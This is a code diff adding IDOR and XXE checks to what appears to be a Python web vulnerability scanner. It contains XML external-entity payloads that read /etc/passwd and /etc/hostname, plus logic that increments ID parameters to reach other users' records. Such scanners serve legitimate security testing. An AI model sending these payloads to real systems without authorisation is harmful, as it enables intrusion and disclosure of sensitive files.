@@ -364,13 +364,130 @@ class InfoDisclosureScanner(BaseScanner):
         return issues
 
 
+class IDORScanner(BaseScanner):
+    ID_PATTERNS = [
+        'id=', 'user_id=', 'account_id=', 'order_id=',
+        'product_id=', 'item_id=', 'profile_id=', 'ref='
+    ]
+
+    def __init__(self):
+        super().__init__()
+        self.name = "IDOR Scanner"
+
+    def scan(self, target: str, options: Dict = None) -> List[VulnerabilityIssue]:
+        issues = []
+
+        try:
+            from urllib.parse import urlparse, parse_qs
+
+            parsed = urlparse(target)
+            params = parse_qs(parsed.query)
+
+            for param in params:
+                if any(p in param.lower() for p in ['id', 'user', 'account', 'order', 'product']):
+                    original_value = params[param][0]
+
+                    try:
+                        int_val = int(original_value)
+                        modified = int_val + 1
+
+                        test_params = params.copy()
+                        test_params[param] = [str(modified)]
+
+                        from urllib.parse import urlencode
+                        test_query = urlencode(test_params, doseq=True)
+                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
+
+                        orig_response = requests.get(target, timeout=10)
+                        mod_response = requests.get(test_url, timeout=10)
+
+                        if orig_response.status_code == mod_response.status_code == 200:
+                            if orig_response.text != mod_response.text:
+                                if "unauthorized" not in mod_response.text.lower() and "forbidden" not in mod_response.text.lower():
+                                    issues.append(VulnerabilityIssue(
+                                        issue_type=IssueType.IDOR,
+                                        severity=Severity.HIGH,
+                                        name="Insecure Direct Object Reference (IDOR)",
+                                        description="User can access other users' data by changing ID parameter",
+                                        url=test_url,
+                                        parameter=param,
+                                        evidence=f"Modified {param} from {original_value} to {modified}",
+                                        remediation="Implement proper authorization checks"
+                                    ))
+
+                    except (ValueError, TypeError):
+                        pass
+
+        except Exception as e:
+            pass
+
+        for issue in issues:
+            self.issue_tracker.add_issue(issue)
+
+        return issues
+
+
+class XXEScanner(BaseScanner):
+    PAYLOADS = [
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost">]><foo>&xxe;</foo>',
+        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>',
+    ]
+
+    def __init__(self):
+        super().__init__()
+        self.name = "XXE Scanner"
+
+    def scan(self, target: str, options: Dict = None) -> List[VulnerabilityIssue]:
+        issues = []
+
+        try:
+            for payload in self.PAYLOADS:
+                headers = {'Content-Type': 'application/xml'}
+                response = requests.post(target, data=payload, headers=headers, timeout=10)
+
+                if "root:" in response.text or "daemon:" in response.text:
+                    issues.append(VulnerabilityIssue(
+                        issue_type=IssueType.XXE,
+                        severity=Severity.CRITICAL,
+                        name="XML External Entity (XXE) Injection",
+                        description="XML parser processes external entities",
+                        url=target,
+                        evidence="Sensitive file contents in response",
+                        remediation="Disable external entity processing"
+                    ))
+                    break
+
+                if "<!ENTITY" in response.text or "SYSTEM" in response.text:
+                    issues.append(VulnerabilityIssue(
+                        issue_type=IssueType.XXE,
+                        severity=Severity.MEDIUM,
+                        name="Potential XXE Vulnerability",
+                        description="XML parser may process external entities",
+                        url=target,
+                        evidence="XXE payload reflected",
+                        remediation="Disable external entities"
+                    ))
+                    break
+
+        except Exception as e:
+            pass
+
+        for issue in issues:
+            self.issue_tracker.add_issue(issue)
+
+        return issues
+
+
 def get_all_scanners() -> List[BaseScanner]:
     return [
         XSSScanner(),
         SQLInjectionScanner(),
         CommandInjectionScanner(),
         SSRFScanner(),
-        InfoDisclosureScanner()
+        InfoDisclosureScanner(),
+        IDORScanner(),
+        XXEScanner()
     ]
 
 
